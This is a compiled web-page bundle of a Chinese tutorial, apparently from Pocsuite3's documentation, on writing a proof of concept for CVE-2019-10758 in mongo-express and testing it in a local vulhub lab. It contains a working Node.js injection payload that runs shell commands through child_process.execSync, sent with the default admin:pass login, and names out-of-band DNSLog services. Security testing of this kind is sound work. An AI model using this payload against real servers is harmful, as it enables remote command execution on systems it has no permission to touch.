import{_ as s,j as n,g as a,I as e}from"./chunks/framework.4d72ab90.js";var p="/assets/poc-demo-cve-2019-10758_verify.1b432250.png";const F=JSON.parse('{"title":"mongo-express \u8BA4\u8BC1\u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08CVE-2019-10758\uFF09","description":"","frontmatter":{},"headers":[{"level":2,"title":"PoC \u5F00\u53D1","slug":"poc-\u5F00\u53D1"},{"level":2,"title":"\u642D\u5EFA\u9776\u573A","slug":"\u642D\u5EFA\u9776\u573A"},{"level":2,"title":"\u6F0F\u6D1E\u9A8C\u8BC1","slug":"\u6F0F\u6D1E\u9A8C\u8BC1"}],"relativePath":"guide/poc-demo-cve-2019-10758.md","lastUpdated":1657949701000}'),l={name:"guide/poc-demo-cve-2019-10758.md"},o=e(`<h1 id="mongo-express-\u8BA4\u8BC1\u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08cve-2019-10758\uFF09" tabindex="-1">mongo-express \u8BA4\u8BC1\u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08CVE-2019-10758\uFF09 <a class="header-anchor" href="#mongo-express-\u8BA4\u8BC1\u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08cve-2019-10758\uFF09" aria-hidden="true">#</a></h1><p>\u6F0F\u6D1E\u7EC6\u8282\uFF1A<a href="https://www.seebug.org/vuldb/ssvid-98116" target="_blank" rel="noreferrer">mongo-express\u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08CVE-2019-10758\uFF09</a></p><p>Mongo-express \u662F\u4E00\u4E2A\u57FA\u4E8E Node.js \u548C express \u7684\u5F00\u6E90\u7684 MongoDB Web \u7BA1\u7406\u754C\u9762\u3002<code>mongo-express &lt;= 0.53.0</code> \u7248\u672C\u5B58\u5728\u8BA4\u8BC1\u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u3002\u5982\u679C\u653B\u51FB\u8005\u53EF\u4EE5\u6210\u529F\u767B\u5F55\uFF0C\u6216\u8005\u76EE\u6807\u670D\u52A1\u5668\u6CA1\u6709\u4FEE\u6539\u9ED8\u8BA4\u7684\u8D26\u53F7\u5BC6\u7801\uFF08<code>admin:pass</code>\uFF09\uFF0C\u5219\u53EF\u4EE5\u6267\u884C\u4EFB\u610F node.js \u4EE3\u7801\u3002</p><h2 id="poc-\u5F00\u53D1" tabindex="-1">PoC \u5F00\u53D1 <a class="header-anchor" href="#poc-\u5F00\u53D1" aria-hidden="true">#</a></h2><p>\u4F7F\u7528 <code>pocsuite --new</code> \u751F\u6210\u6A21\u7248\uFF0C\u7531\u4E8E\u8BE5\u6F0F\u6D1E\u6CA1\u6709\u56DE\u663E\uFF0C\u6211\u4EEC\u4F7F\u7528 <a href="http://www.ceye.io" target="_blank" rel="noreferrer">CEye</a> \u6216\u8005 <a href="https://github.com/projectdiscovery/interactsh" target="_blank" rel="noreferrer">Interactsh</a> \u7B49 DNSLog \u670D\u52A1\u6765\u8F85\u52A9\u9A8C\u8BC1\u3002</p><p><a href="https://github.com/projectdiscovery/interactsh" target="_blank" rel="noreferrer">Interactsh</a> \u662F\u77E5\u540D\u5F00\u6E90\u8F6F\u4EF6\u7EC4\u7EC7 projectdiscovery \u5F00\u53D1\u7684\u4E00\u6B3E DNSLog \u5DE5\u5177\uFF0C\u53EA\u8981\u6709\u4E00\u4E2A\u57DF\u540D\uFF0C\u5C31\u53EF\u4EE5\u5FEB\u901F\u642D\u5EFA\u5C5E\u4E8E\u81EA\u5DF1\u7684 oob \u670D\u52A1\u3002\u7F51\u4E0A\u4E5F\u6709\u4E00\u4E9B\u516C\u5F00\u53EF\u7528\u7684\uFF0C\u5982\uFF1A<code>interact.sh, oast.pro, oast.live, oast.site, oast.online, oast.fun, oast.me</code>\u3002</p><p>\u751F\u6210\u6A21\u7248\uFF1A</p><div class="language-bash"><span class="copy"></span><pre><code><span class="line"><span style="color:#A6ACCD;">\u279C pocsuite --new</span></span>
<span class="line"><span style="color:#A6ACCD;">...</span></span>
<span class="line"><span style="color:#A6ACCD;">-----</span></span>
<span class="line"><span style="color:#A6ACCD;">Seebug ssvid </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, 99335</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">0</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;">: 98116</span></span>
<span class="line"><span style="color:#A6ACCD;">PoC author </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, Seebug</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[]</span><span style="color:#A6ACCD;">: Seebug</span></span>
<span class="line"><span style="color:#A6ACCD;">Vulnerability disclosure date </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, 2021-8-18</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">2022-7-11</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;">: 2020-01-03</span></span>
<span class="line"><span style="color:#A6ACCD;">Advisory URL </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, https://www.seebug.org/vuldb/ssvid-99335</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">https://www.seebug.org/vuldb/ssvid-98116</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;">:</span></span>
<span class="line"><span style="color:#A6ACCD;">Vulnerability CVE number </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, CVE-2021-22123</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[]</span><span style="color:#A6ACCD;">: CVE-2019-10758</span></span>
<span class="line"><span style="color:#A6ACCD;">Vendor name </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, Fortinet</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[]</span><span style="color:#A6ACCD;">:</span></span>
<span class="line"><span style="color:#A6ACCD;">Product or component name </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, FortiWeb</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[]</span><span style="color:#A6ACCD;">: mongo-express</span></span>
<span class="line"><span style="color:#A6ACCD;">Affected version </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, </span><span style="color:#89DDFF;">&lt;</span><span style="color:#A6ACCD;">=6.4.0</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[]</span><span style="color:#A6ACCD;">: </span><span style="color:#89DDFF;">&lt;</span><span style="color:#A6ACCD;">=0.53.0</span></span>
<span class="line"><span style="color:#A6ACCD;">Vendor homepage </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, https://www.fortinet.com</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[]</span><span style="color:#A6ACCD;">: https://github.com/mongo-express/mongo-express</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A6ACCD;">0    Arbitrary File Read</span></span>
<span class="line"><span style="color:#A6ACCD;">1    Code Execution</span></span>
<span class="line"><span style="color:#A6ACCD;">2    Command Execution</span></span>
<span class="line"><span style="color:#A6ACCD;">3    Denial Of service</span></span>
<span class="line"><span style="color:#A6ACCD;">4    Information Disclosure</span></span>
<span class="line"><span style="color:#A6ACCD;">5    Login Bypass</span></span>
<span class="line"><span style="color:#A6ACCD;">6    Path Traversal</span></span>
<span class="line"><span style="color:#A6ACCD;">7    SQL Injection</span></span>
<span class="line"><span style="color:#A6ACCD;">8    SSRF</span></span>
<span class="line"><span style="color:#A6ACCD;">9    XSS</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A6ACCD;">Vulnerability type, choose from above or provide </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, 3</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[]</span><span style="color:#A6ACCD;">: 1</span></span>
<span class="line"><span style="color:#A6ACCD;">Authentication Required </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, yes</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">no</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;">: yes  </span><span style="color:#676E95;font-style:italic;"># \u6F0F\u6D1E\u9700\u8981\u8BA4\u8BC1</span></span>
<span class="line"><span style="color:#A6ACCD;">Can we get result of </span><span style="color:#82AAFF;">command</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, yes</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">no</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;">: no  </span><span style="color:#676E95;font-style:italic;"># \u6F0F\u6D1E\u65E0\u56DE\u663E</span></span>
<span class="line"><span style="color:#A6ACCD;">Out-of-band server to use </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, interactsh</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">ceye</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;">: interactsh  </span><span style="color:#676E95;font-style:italic;"># \u9009\u62E9\u4F7F\u7528\u54EA\u4E2A oob \u670D\u52A1</span></span>
<span class="line"><span style="color:#A6ACCD;">...</span></span>
<span class="line"></span>
<span class="line"></span></code></pre></div><p>\u6839\u636E\u6F0F\u6D1E\u7EC6\u8282\uFF0C\u5BF9\u6A21\u7248\u8FDB\u884C\u7B80\u5355\u4FEE\u6539\uFF1A</p><div class="language-diff"><span class="copy"></span><pre><code><span class="line"><span style="color:#A6ACCD;">     def _options(self):</span></span>
<span class="line"><span style="color:#A6ACCD;">         o = OrderedDict()</span></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">        o[&#39;user&#39;] = OptString(&#39;&#39;, description=&#39;The username to authenticate as&#39;, require=True)</span></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">        o[&#39;pwd&#39;] = OptString(&#39;&#39;, description=&#39;The password for the username&#39;, require=True)</span></span>
<span class="line"><span style="color:#89DDFF;">+</span><span style="color:#C3E88D;">        o[&#39;user&#39;] = OptString(&#39;admin&#39;, description=&#39;The username to authenticate as&#39;, require=True)</span></span>
<span class="line"><span style="color:#89DDFF;">+</span><span style="color:#C3E88D;">        o[&#39;pwd&#39;] = OptString(&#39;pass&#39;, description=&#39;The password for the username&#39;, require=True)</span></span>
<span class="line"><span style="color:#A6ACCD;">         o[&#39;cmd&#39;] = OptString(&#39;uname -a&#39;, description=&#39;The command to execute&#39;)</span></span>
<span class="line"><span style="color:#A6ACCD;">         return o</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A6ACCD;">     def _exploit(self, param=&#39;&#39;):</span></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">        if not self._check(dork=&#39;&#39;):</span></span>
<span class="line"><span style="color:#89DDFF;">+</span><span style="color:#C3E88D;">        if not self._check(dork=&#39;mongo-express=&#39;):</span></span>
<span class="line"><span style="color:#A6ACCD;">             return False</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A6ACCD;">         user = self.get_option(&#39;user&#39;)</span></span>
<span class="line"><span style="color:#A6ACCD;">         pwd = self.get_option(&#39;pwd&#39;)</span></span>
<span class="line"><span style="color:#A6ACCD;">         headers = {&#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;}</span></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">        payload = &#39;a=b&#39;</span></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">        res = requests.post(self.url, headers=headers, data=payload)</span></span>
<span class="line"><span style="color:#89DDFF;">+</span><span style="color:#C3E88D;">        payload = (</span></span>
<span class="line"><span style="color:#89DDFF;">+</span><span style="color:#C3E88D;">            &#39;document=this.constructor.constructor(&quot;return process&quot;)().&#39;</span></span>
<span class="line"><span style="color:#89DDFF;">+</span><span style="color:#C3E88D;">            f&#39;mainModule.require(&quot;child_process&quot;).execSync(&quot;{param}&quot;)&#39;</span></span>
<span class="line"><span style="color:#89DDFF;">+</span><span style="color:#C3E88D;">        )</span></span>
<span class="line"><span style="color:#89DDFF;">+</span><span style="color:#C3E88D;">        res = requests.post(f&#39;{self.url}/checkValid&#39;, headers=headers, data=payload, auth=(user, pwd))</span></span>
<span class="line"><span style="color:#A6ACCD;">         logger.debug(res.text)</span></span>
<span class="line"><span style="color:#A6ACCD;">         return res.text</span></span>
<span class="line"></span></code></pre></div><h2 id="\u642D\u5EFA\u9776\u573A" tabindex="-1">\u642D\u5EFA\u9776\u573A <a class="header-anchor" href="#\u642D\u5EFA\u9776\u573A" aria-hidden="true">#</a></h2><p>\u4F7F\u7528 <a href="https://github.com/vulhub/vulhub" target="_blank" rel="noreferrer">vulhub</a> \u642D\u5EFA\u6F0F\u6D1E\u73AF\u5883\u3002</p><div class="language-"><span class="copy"></span><pre><code><span class="line"><span style="color:#A6ACCD;">\u250C\u2500\u2500(kali\u327Fkali)-[/tmp]</span></span>
<span class="line"><span style="color:#A6ACCD;">\u2514\u2500$ git clone https://github.com/vulhub/vulhub.git &amp;&amp; cd vulhub/mongo-express/CVE-2019-10758 &amp;&amp; docker-compose up -d</span></span>
<span class="line"><span style="color:#A6ACCD;">Cloning into &#39;vulhub&#39;...</span></span>
<span class="line"><span style="color:#A6ACCD;">remote: Enumerating objects: 12574, done.</span></span>
<span class="line"><span style="color:#A6ACCD;">remote: Total 12574 (delta 0), reused 0 (delta 0), pack-reused 12574</span></span>
<span class="line"><span style="color:#A6ACCD;">Receiving objects: 100% (12574/12574), 139.45 MiB | 1015.00 KiB/s, done.</span></span>
<span class="line"><span style="color:#A6ACCD;">Resolving deltas: 100% (5003/5003), done.</span></span>
<span class="line"><span style="color:#A6ACCD;">Creating network &quot;cve-2019-10758_default&quot; with the default driver</span></span>
<span class="line"><span style="color:#A6ACCD;">Creating cve-2019-10758_mongo_1 ... done</span></span>
<span class="line"><span style="color:#A6ACCD;">Creating cve-2019-10758_web_1   ... done</span></span>
<span class="line"><span style="color:#A6ACCD;">                                                                                                                                                                                 </span></span>
<span class="line"><span style="color:#A6ACCD;">\u250C\u2500\u2500(kali\u327Fkali)-[/tmp/vulhub/mongo-express/CVE-2019-10758]</span></span>
<span class="line"><span style="color:#A6ACCD;">\u2514\u2500$ curl -I localhost:8081</span></span>
<span class="line"><span style="color:#A6ACCD;">HTTP/1.1 200 OK</span></span>
<span class="line"><span style="color:#A6ACCD;">X-Powered-By: Express</span></span>
<span class="line"><span style="color:#A6ACCD;">Content-Type: text/html; charset=utf-8</span></span>
<span class="line"><span style="color:#A6ACCD;">Content-Length: 8199</span></span>
<span class="line"><span style="color:#A6ACCD;">ETag: W/&quot;2007-KWtm8qZk7ZuiLlUF3uCj0lng5+Q&quot;</span></span>
<span class="line"><span style="color:#A6ACCD;">Set-Cookie: mongo-express=s%3AaKAompVZQO7rTWLcDL0RqFa1FMt-ufPd.PTqXL2A%2BZm8I6o%2BT6Jz1xNLDTbbsJi1IS%2BmouRgrJns; Path=/; HttpOnly</span></span>
<span class="line"><span style="color:#A6ACCD;">Date: Thu, 14 Jul 2022 23:01:01 GMT</span></span>
<span class="line"><span style="color:#A6ACCD;">Connection: keep-alive</span></span>
<span class="line"><span style="color:#A6ACCD;">                                                                       </span></span>
<span class="line"><span style="color:#A6ACCD;"></span></span></code></pre></div><h2 id="\u6F0F\u6D1E\u9A8C\u8BC1" tabindex="-1">\u6F0F\u6D1E\u9A8C\u8BC1 <a class="header-anchor" href="#\u6F0F\u6D1E\u9A8C\u8BC1" aria-hidden="true">#</a></h2><p>\u901A\u8FC7\u547D\u4EE4\u884C\u53C2\u6570 <code>--user admin --pwd pass --oob-server interact.sh</code> \u5206\u522B\u6307\u5B9A\u4E86\u7528\u6237\u540D\u3001\u5BC6\u7801\u3001\u548C\u4F7F\u7528\u7684 DNSLog \u670D\u52A1\u5730\u5740\uFF0C\u4E5F\u53EF\u4EE5\u4E0D\u6307\u5B9A\uFF0C\u4F7F\u7528\u9ED8\u8BA4\u503C\u3002</p><p><img src="`+p+'" alt=""></p>',16),t=[o];function r(c,C,D,i,A,y){return a(),n("div",null,t)}var u=s(l,[["render",r]]);export{F as __pageData,u as default};
